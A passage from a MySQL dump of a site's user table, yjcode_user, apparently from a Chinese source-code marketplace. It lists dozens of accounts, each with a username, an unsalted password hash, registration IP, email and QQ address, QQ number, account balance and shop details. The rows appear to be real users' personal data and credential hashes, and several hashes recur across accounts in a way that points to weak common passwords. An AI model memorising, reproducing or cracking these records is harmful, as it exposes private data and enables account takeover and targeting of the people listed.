(104, 'ceshi888', 'dd5fef9c1c1da1394d6d34b248c51be2ad740840', '2017-09-07 01:23:16', '223.96.222.136', 0.01, 20, '测试888', NULL, 0, '709338141@qq.com', 0, '709338141', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7c4a8d09ca3762af61e59520943dc26494f8941b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(105, '75321', 'dd5fef9c1c1da1394d6d34b248c51be2ad740840', '2017-09-07 10:06:49', '223.96.222.114', 0.00976563, 20, 'yyoo', NULL, 0, '709338141@qq.com', 0, '709338141', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7c4a8d09ca3762af61e59520943dc26494f8941b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(106, 'cytf123', '601f1889667efaebb33b8c12572835da3f027f78', '2017-09-08 23:29:04', '36.40.29.95', 0.01, 10, 'haha', NULL, 0, '260391909@qq.com', 0, '260391909', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '601f1889667efaebb33b8c12572835da3f027f78', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(107, 'wee19910317', '450b19d6b8ba014e08e8904d6e32cd9ecb384014', '2017-09-12 17:30:25', '60.171.240.222', 0.01, 10, '5151', NULL, 0, '65165165@qq.com', 0, '651651', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '450b19d6b8ba014e08e8904d6e32cd9ecb384014', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(108, '45435435', 'f7c3bc1d808e04732adf679965ccc34ca7ae3441', '2017-09-15 00:19:27', '223.166.20.195', 0.01, 10, '4564', NULL, 0, '354353@qq.com', 0, '65456456', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'f7c3bc1d808e04732adf679965ccc34ca7ae3441', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(109, 'tianbao', 'dca38e37a86f31cc66e03a48424cf6e6108a9652', '2017-09-15 08:34:38', '14.127.231.47', 0.01, 10, 'tianbao', NULL, 0, 'wjx2030@163.com', 0, '123456', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'dca38e37a86f31cc66e03a48424cf6e6108a9652', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(110, 'qq1505467100231', '7c4a8d09ca3762af61e59520943dc26494f8941b', '2017-09-15 17:18:20', '163.142.51.9', 0.01, 10, '沙瓦迪卡', NULL, 0, NULL, 0, NULL, NULL, '2014-10-15 00:00:00', '7C8A006ED4DD07A9F1FE90F60CF64F64', 1, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(111, 'miduo', 'dd5fef9c1c1da1394d6d34b248c51be2ad740840', '2017-09-17 18:02:36', '223.96.221.164', 3941.01, 20, '米多', '', 0, '709338141@qq.com', 1, '709338141', '', '2014-10-15 00:00:00', NULL, NULL, 30, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, '', NULL, NULL, NULL, NULL, 'bda5e5b10debf1e9cbf3098f33b65daa57bcb800', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, '普通会员', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(112, 'qq150782063149', '69c5fcebaa65b560eaf06c3fbeb481ae44b8d618', '2017-10-12 23:03:51', '223.87.102.31', 0.01, 10, 'a＇', '', 0, 'qq150782063149@qq.com', 0, '', NULL, '2014-10-15 00:00:00', 'C9D74C6D0D6F21472A4A80A4129A7759', 1, 664, '源码商城4', '', '', '', 2742, 1, 0, 2, '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, '69c5fcebaa65b560eaf06c3fbeb481ae44b8d618', 0, 0, 0, 0.8, 27417, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(113, '9213711', 'a2d8050b88ddd330795ee4b0f2e54fa4c46a092d', '2017-10-13 22:04:19', '123.190.77.200', 0.01, 10, '136230302', '', 0, '136230302@qq.com', 0, '136230302', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'a2d8050b88ddd330795ee4b0f2e54fa4c46a092d', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(114, 'qq1508213053292', '69c5fcebaa65b560eaf06c3fbeb481ae44b8d618', '2017-10-17 12:04:13', '58.254.108.123', 0.01, 10, '', '', 0, 'qq1508213053292@qq.com', 0, '', NULL, '2014-10-15 00:00:00', 'A1B27C37ECDC998C6683D3024C61068B', 1, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '69c5fcebaa65b560eaf06c3fbeb481ae44b8d618', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(115, 'qq150821824588', '69c5fcebaa65b560eaf06c3fbeb481ae44b8d618', '2017-10-17 13:30:45', '223.64.187.150', 0.01, 10, '英雄关羽', '', 0, 'qq150821824588@qq.com', 0, '', NULL, '2014-10-15 00:00:00', 'E2F1B3E9CEB3C980250DD0DED6901E8A', 1, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '69c5fcebaa65b560eaf06c3fbeb481ae44b8d618', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(116, 'qq1508241437161', 'dd5fef9c1c1da1394d6d34b248c51be2ad740840', '2017-10-17 19:57:17', '222.222.189.58', 8000.01, 10, '北冰洋', '', 0, 'qq1508241437161@qq.com', 0, '', '', '2018-02-26 14:02:19', '18EE10A8B2CF94EC458E6AB151AA2F20', 1, 856, '源码商城3', '', '', '', 27, 1, 0, 2, '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'dd5fef9c1c1da1394d6d34b248c51be2ad740840', 0, 0, 0, 0.8, 7777, NULL, 3, NULL, NULL, 0, 5, 5, 5, 0, NULL, '普通会员', NULL, NULL, NULL, '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(117, 'qq150825595363', '69c5fcebaa65b560eaf06c3fbeb481ae44b8d618', '2017-10-17 23:59:13', '101.247.220.60', 0.01, 10, '从来不模仿', '', 0, 'qq150825595363@qq.com', 0, '', NULL, '2014-10-15 00:00:00', '441E1B7C9B69147F6E9B12DA4847B602', 1, 807, '源码商城2', '', '', '', 777, 1, 0, 2, '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, '69c5fcebaa65b560eaf06c3fbeb481ae44b8d618', 0, 0, 0, 0.8, 757, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(118, 'qq150829598313', '69c5fcebaa65b560eaf06c3fbeb481ae44b8d618', '2017-10-18 11:06:23', '183.11.130.112', 0.01, 10, '啊布', '', 0, '80939369@qq.com', 0, '', NULL, '2014-10-15 00:00:00', 'BD2011984E0DDC5A47DEA190A34B7CBD', 1, 741, '源码商城1', '', '', '', 414, 1, 0, 2, '', NULL, NULL, '09873', NULL, NULL, NULL, NULL, '69c5fcebaa65b560eaf06c3fbeb481ae44b8d618', 0, 0, 0, 0.8, 414, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(119, 'qq1508399405122', '69c5fcebaa65b560eaf06c3fbeb481ae44b8d618', '2017-10-19 15:50:05', '116.8.36.90', 0.01, 10, '', '', 0, 'qq1508399405122@qq.com', 0, '', NULL, '2014-10-15 00:00:00', '2FB9C80AFAA523FAE5B872C8E5006E5B', 1, 28, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '69c5fcebaa65b560eaf06c3fbeb481ae44b8d618', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(120, 'wangxin', '41d10d4d041bd0b7c32496541e4a1c2b14fc7cda', '2017-10-25 22:10:48', '1.89.233.190', 0.01, 10, '诗人', '', 0, '55641478@qq.com', 0, '55641478', NULL, '2014-10-15 00:00:00', '', 0, 1, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '41d10d4d041bd0b7c32496541e4a1c2b14fc7cda', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(121, 'liuting', '77b4d2d21ba57656ac98a986ed9e93430090487a', '2017-10-30 13:19:50', '1.89.233.190', 0.01, 10, 'liuting', '', 0, '211145546@qq.com', 0, '211145546', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '77b4d2d21ba57656ac98a986ed9e93430090487a', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(122, 'a00000', '974a0fd2dcc55c1fb3a90d3ca09902bffd8ebac8', '2017-11-01 01:06:55', '183.40.1.97', 0.01, 10, 'a00000', '', 0, '588698@qq.com', 0, '25888', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '974a0fd2dcc55c1fb3a90d3ca09902bffd8ebac8', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(123, 'qq150960156544', '69c5fcebaa65b560eaf06c3fbeb481ae44b8d618', '2017-11-02 13:46:05', '182.140.175.143', 0.01, 10, '磨叽、记者、没需求直接删', '', 0, 'qq150960156544@qq.com', 0, '', NULL, '2014-10-15 00:00:00', '9C97F4278CE2111FAA79C7432BEBE137', 1, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '69c5fcebaa65b560eaf06c3fbeb481ae44b8d618', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(124, 'qweqwe123', '5186ced2831f1e6627b8d6dd39a7f585d2dbbbfc', '2017-11-06 14:44:00', '110.82.171.33', 0.01, 10, '奥术大师多', '', 0, '254551329@qq.com', 0, '254551329', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '5186ced2831f1e6627b8d6dd39a7f585d2dbbbfc', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(125, 'meryq624', '36a4cc19f7b0671a5cf9c8462fc7df3d0446e272', '2017-11-09 10:31:44', '115.217.117.12', 0.01, 10010, 'meryq624', '', 0, '601903000@qq.com', 0, '601903000', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '36a4cc19f7b0671a5cf9c8462fc7df3d0446e272', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(126, '999999', '1f5523a8f535289b3401b29958d01b2966ed61d2', '2017-11-18 15:53:07', '123.161.25.188', 0.01, 10, '999999', '', 0, '999999@qq.com', 0, '999999', NULL, '2018-01-23 16:19:03', '', 0, 378, '123', '321', '123', '<p>35354353</p>', 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1f5523a8f535289b3401b29958d01b2966ed61d2', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', '', '', NULL, NULL, NULL, NULL, NULL, NULL),
(127, '928vip', 'd9f5952fc9c220e4c46cd531619e90252e56a9a5', '2017-11-19 13:00:04', '27.47.232.107', 0.01, 10, '928vip', '', 0, 'x@qq.com', 0, '12345678', NULL, '2018-04-26 13:57:33', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'd9f5952fc9c220e4c46cd531619e90252e56a9a5', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(128, 'yy39111139', 'ec8575c851b98463c55f6707675b6a0ab730dbf3', '2017-11-20 01:33:49', '113.86.38.248', 0.01, 10, 'yy565686', '', 0, '54465656@qq.com', 0, '5454545', NULL, '2014-10-15 00:00:00', '', 0, 859, '适当浮动幅度', '对方是否斯蒂芬', '适当浮动幅度', '<p>www.91moe.com</p>', 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'ec8575c851b98463c55f6707675b6a0ab730dbf3', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', '333333', '', NULL, NULL, NULL, NULL, NULL, NULL),
(129, 'ceshiceshi', '1f82c942befda29b6ed487a51da199f78fce7f05', '2017-11-20 13:10:36', '42.199.131.17', 0.01, 10, '88888', '', 0, '88888@222.com', 0, '88888', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1f82c942befda29b6ed487a51da199f78fce7f05', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(130, '81115027', '26209698d25963b78aa84e7c97d972cfae4e9627', '2017-11-21 01:39:46', '116.8.38.248', 0.01, 10, '81115027', '', 0, '81115027@qq.com', 0, '81115027', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, '971649', NULL, NULL, NULL, NULL, '26209698d25963b78aa84e7c97d972cfae4e9627', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(131, 'gwqlike', 'addb4b3fcfa5e00dbabdc8268506f462699df488', '2017-11-21 13:23:47', '36.98.36.246', 0.01, 10, 'gwqlike', '', 0, '382869653@qq.com', 0, '382869653', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'addb4b3fcfa5e00dbabdc8268506f462699df488', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(132, 'qazqaz', '8d56e924f958fa08e2f737fafc319a1863f950f8', '2017-11-22 11:58:12', '113.110.103.15', 0.01, 10, 'qazqaz', '', 0, 'qazqaz@11.com', 0, '345234', NULL, '2014-10-15 00:00:00', '', 0, 1, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '8d56e924f958fa08e2f737fafc319a1863f950f8', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(133, 'cym188', 'c0087422d01c032c0bfb4c7fae09021138420938', '2017-11-26 00:40:34', '120.230.77.0', 0.01, 10, 'cym188', '', 0, '471912190@qq.com', 0, '471912190', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'c0087422d01c032c0bfb4c7fae09021138420938', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(134, 'mko000', '0123c41d38517826ddfa29b98c11879d46b8fb4b', '2017-11-26 03:36:04', '120.229.3.193', -0.000000000223517, 10, 'mko000', '', 0, '2000000@qq.com', 0, '2000000', NULL, '2014-10-15 00:00:00', '', 0, 1, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, '108187', NULL, NULL, NULL, NULL, '0123c41d38517826ddfa29b98c11879d46b8fb4b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, -0.000000000223517, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(135, '17581758', '1e6d745667e5326c3ca022db5b0eb60edb61f836', '2017-11-27 11:13:42', '119.176.200.29', 0.01, 20, '17581758', '', 0, '17581758@asfd.com', 0, '17581758', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1e6d745667e5326c3ca022db5b0eb60edb61f836', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL);
INSERT INTO `yjcode_user` (`id`, `uid`, `pwd`, `sj`, `uip`, `money1`, `jf`, `nc`, `mot`, `ifmot`, `email`, `ifemail`, `uqq`, `weixin`, `yxsj`, `openid`, `ifqq`, `djl`, `shopname`, `seokey`, `seodes`, `txt`, `pm`, `zt`, `openshop`, `shopzt`, `shopztsm`, `getpwd`, `bdmot`, `bdemail`, `txyh`, `txname`, `txzh`, `txkhh`, `zfmm`, `sellmall`, `sellmyue`, `tjuserid`, `sellbl`, `xinyong`, `sfz`, `sfzrz`, `sfzrzsm`, `uname`, `djmoney`, `pf1`, `pf2`, `pf3`, `baomoney`, `dqsj`, `userdj`, `userdjdq`, `ordertx1`, `ordertx2`, `wxopenid`, `myweb`, `unionid`, `mytxt`, `shoptype`, `openshop1`, `mybh`, `jbmot`, `ifmian`) VALUES
(136, 'guaishoubudou', '903e11ca687f1dd49a2b04156b151210e8ae4f70', '2017-11-29 03:58:38', '120.15.178.174', 0.01, 10, 'guaishoubudou', '', 0, '89370318@qq.com', 0, '89370318', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '903e11ca687f1dd49a2b04156b151210e8ae4f70', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(137, 'laolin198', '2891baceeef1652ee698294da0e71ba78a2a4064', '2017-12-10 10:41:27', '113.225.168.54', 0.01, 10, '阿斯顿23', '', 0, '88024694@qq.com', 0, '2332323', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2891baceeef1652ee698294da0e71ba78a2a4064', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(138, '45645656', 'cf8a80a07bb0ad6301a02a6c24f0becc3df69563', '2017-12-12 23:36:58', '223.157.221.143', 0.01, 10, '45645656', '', 0, '45645656@qq.com', 0, '45645656', NULL, '2014-10-15 00:00:00', '', 0, 70, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'cf8a80a07bb0ad6301a02a6c24f0becc3df69563', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(139, '147258', 'd54b76b2bad9d9946011ebc62a1d272f4122c7b5', '2017-12-14 11:57:07', '111.19.44.228', 0.01, 10, '369258', '', 0, '973522968@qq.com', 0, '973522968@qq.com', NULL, '2014-10-15 00:00:00', '', 0, 36, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7c4a8d09ca3762af61e59520943dc26494f8941b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(140, 'Driver', 'e6a7c2be9a9e5c99b83aed0d4e4b2bb7e4b32696', '2017-12-14 20:48:28', '116.18.228.242', 0.01, 20, 'Driver', '', 0, '490530551@qq.com', 0, '490530551', NULL, '2014-10-15 00:00:00', '', 0, 62, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'e6a7c2be9a9e5c99b83aed0d4e4b2bb7e4b32696', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(141, 'lajin', '30c98f759c88c4eab6c300b5dd700b0e7b3c45d1', '2017-12-15 14:25:53', '101.226.225.84', 0.01, 10, '2244548141', '', 0, '2244548141@qq.com', 1, '5464646', '', '2014-10-15 00:00:00', '', 0, 16, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '30c98f759c88c4eab6c300b5dd700b0e7b3c45d1', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, '普通会员', NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(142, '12345678', 'be85ecb3faf93b9ac9d5413b3edc5bbc5c6bb8ef', '2017-12-28 23:58:30', '119.134.103.52', 0.01, 10, '93607712', '', 0, '93607712@qq.com', 0, '12345678', '', '2019-10-25 11:32:15', '', 0, 116, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'be85ecb3faf93b9ac9d5413b3edc5bbc5c6bb8ef', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, '普通会员', NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, '0791456001571972108', NULL, NULL),
(143, 'qq1515762984185', 'ed72ff586291beae72d97ff936dcba08e87b7444', '2018-01-12 21:16:24', '183.226.92.165', 0.01, 10, '黄宏发', '', 0, '885617199@qq.com', 0, '', '', '2014-10-15 00:00:00', '5D3E5611EBD1B479ADFCD9D8F84E1EB5', 1, 131, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'ed72ff586291beae72d97ff936dcba08e87b7444', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, '普通会员', NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(144, 'qq1516209707149', 'faa1cc4a4dc9975f68de2773c1941c1066b65b23', '2018-01-18 01:21:47', '120.239.209.185', 0.01, 10, '371401730', '', 0, '371401730@qq.com', 0, '', '', '2014-10-15 00:00:00', '33F35401E771E4C36ACDEFF0FD729A33', 1, 24, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'faa1cc4a4dc9975f68de2773c1941c1066b65b23', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, '普通会员', NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(145, '0123456789', '87acec17cd9dcd20a716cc2cf67417b71c8a7016', '2018-01-21 15:04:57', '119.134.103.56', 0.01, 10, '89359884', '', 0, '89359884@qq.com', 1, '0123456789', '', '2018-01-22 13:16:06', '', 0, 24, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '87acec17cd9dcd20a716cc2cf67417b71c8a7016', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, '普通会员', NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(146, 'qq1516775581121', '7c4a8d09ca3762af61e59520943dc26494f8941b', '2018-01-24 14:33:01', '14.25.41.157', 0.01, 10, '萝莉保护协会/副会长', '', 0, 'qq1516775581121@qq.com', 0, '', NULL, '2018-03-21 01:04:22', '738F4E72CC5217D7C05BBD277B7D7067', 1, 16, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7c4a8d09ca3762af61e59520943dc26494f8941b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(147, '6154455', '2c76f898692d1a2d00842c36a1e9fa741260b1f3', '2018-01-24 16:55:29', '223.157.142.250', 141.01, 10, '6154455', '', 0, '6154455@qq.com', 0, '6154455', '', '2018-02-04 15:31:46', '', 0, 44, NULL, NULL, NULL, NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2c76f898692d1a2d00842c36a1e9fa741260b1f3', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, '普通会员', NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
